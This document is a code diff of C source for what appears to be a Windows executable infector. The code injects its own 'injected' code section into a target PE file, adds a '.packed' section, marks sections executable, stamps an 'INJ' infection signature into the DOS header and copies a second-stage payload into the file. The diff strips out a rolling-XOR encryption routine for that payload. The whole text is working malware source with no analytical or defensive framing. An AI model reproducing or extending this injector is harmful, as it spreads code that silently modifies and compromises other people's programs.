@@ -278,19 +278,6 @@ typedef HMODULE (*get_module_handle_def)(
     LPCSTR lpModuleName
 );
 
-typedef LPVOID (*virtual_alloc_def)(
-    LPVOID lpAddress,
-    SIZE_T dwSize,
-    DWORD  flAllocationType,
-    DWORD  flProtect
-);
-
-typedef BOOL (*virtual_free_def)(
-    LPVOID lpAddress,
-    SIZE_T dwSize,
-    DWORD  dwFreeType
-);
-
 //__declspec(allocate("injected"))
 __declspec(allocate("decrypt"))
 short kernel32_str_d[] = L"C:\\Windows\\System32\\KERNEL32.DLL";
@@ -301,12 +288,6 @@ short kernel32_str[] = L"C:\\Windows\\System32\\KERNEL32.DLL";
 //__declspec(allocate("injected"))
 __declspec(allocate("decrypt"))
 char get_module_handle_str_d[] = "GetModuleHandle";
-
-__declspec(allocate("injected"))
-char virtual_alloc_str[] = "VirtualAlloc";
-
-__declspec(allocate("injected"))
-char virtual_free_str[] = "VirtualFree";
 
 __declspec(allocate("injected"))
 char get_module_handle_str[] = "GetModuleHandle";
@@ -368,34 +349,6 @@ char new_section_name[] = ".packed";
 
 __declspec(allocate("injected"))
 int new_section_size = 0x1000;
-
-__declspec(allocate("injected"))
-char signature[] = "INJ\x00";
-
-__declspec(code_seg("injected"))
-PUCHAR copy_and_encrypt_i(PVOID addr, DWORD size, PVOID dll) {
-    DWORD oldProtect;
-    //PVOID dll = get_dll(kernel32_str_d);
-    PVOID virtual_alloc = get_func(virtual_alloc_str, dll);
-    //PVOID virtual_free = get_func_d(virtual_free_str, dll);
-    
-    PUCHAR to_encrypt = (PUCHAR)((virtual_alloc_def)virtual_alloc)(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    
-    my_memcpy_i(to_encrypt, (PUCHAR)(addr), size);
-
-    //VirtualProtect(addr, size, PAGE_READWRITE, &oldProtect);
-    DWORD KEY = 0xAA;
-    DWORD new_key = 0;
-    for(DWORD i=0; i<size; ++i) {
-        new_key = ((PUCHAR)to_encrypt)[i] ^ KEY;
-        ((PUCHAR)to_encrypt)[i] = new_key;
-        KEY = new_key;
-    }
-
-    // Restore original protection
-    //VirtualProtect(addr, size, oldProtect, &oldProtect);
-    return (PUCHAR)(to_encrypt);
-}
 
 __declspec(code_seg("injected"))
 int add_section_i(BYTE *fileData, char *data, DWORD size) {
@@ -542,7 +495,7 @@ int injector(PVOID dll, char *thefile)
     WORD idxSection = pNtHeader->FileHeader.NumberOfSections - 2;
 
     //LPVOID relocSectionPtr = (LPVOID)((BYTE*)hModule + pSection[idxSection].VirtualAddress);
-    DWORD size = pSection[idxSection].SizeOfRawData - (pNtHeader->OptionalHeader.AddressOfEntryPoint - pSection[idxSection].VirtualAddress) + 1;
+    DWORD size = pSection[idxSection].SizeOfRawData - (pNtHeader->OptionalHeader.AddressOfEntryPoint - pSection[idxSection].VirtualAddress);
     DWORD first_stage_size = size;
     LPVOID srcPtr = entryPoint;
 
@@ -600,7 +553,7 @@ int injector(PVOID dll, char *thefile)
     } 
     // LIST PE HEADER
     pDosHeader = (PIMAGE_DOS_HEADER)lpMapAdr;
-    my_memcpy_i((void*)&pDosHeader->e_res2[8], signature, 4);
+    my_memcpy_i((void*)&pDosHeader->e_res2[8], "INJ\x00", 4);
     //*((&pDosHeader->e_res2[8]) - 0x2) = first_stage_size;
     pNtHeader = (PIMAGE_NT_HEADERS64)((PUCHAR)lpMapAdr + pDosHeader->e_lfanew);
     pSection = (PIMAGE_SECTION_HEADER)((PUCHAR)pNtHeader + sizeof (IMAGE_NT_HEADERS64));
@@ -616,15 +569,10 @@ int injector(PVOID dll, char *thefile)
     pSection[idxSection].Misc.VirtualSize = first_stage_size;
     pSection[idxSection].SizeOfRawData = (first_stage_size + 0xFFF) & ~0xFFF;
     pSection[idxSection].Characteristics |= IMAGE_SCN_MEM_EXECUTE;  
-    
-    PUCHAR encrypted_second_stage = (PUCHAR)(copy_and_encrypt_i(srcPtr_second_stage, second_stage_size, dll));
 
-    add_section_i((BYTE *)lpMapAdr, (PUCHAR)encrypted_second_stage, second_stage_size);
+    add_section_i((BYTE *)lpMapAdr, (PUCHAR)srcPtr_second_stage, second_stage_size);
 
     PVOID unmap_view_of_file = get_func(unmap_view_of_file_str, dll);
-    PVOID virtual_free = get_func(virtual_free, dll);
-
-    ((virtual_free_def)virtual_free)(encrypted_second_stage, 0, MEM_RELEASE);
 
     // Clean up
     ((unmap_view_of_file_def)unmap_view_of_file)(lpMapAdr);
@@ -702,4 +650,3 @@ VOID encryption(PVOID addr, DWORD size) {
     VirtualProtect(addr, size, oldProtect, &oldProtect);
     return;
 }
-
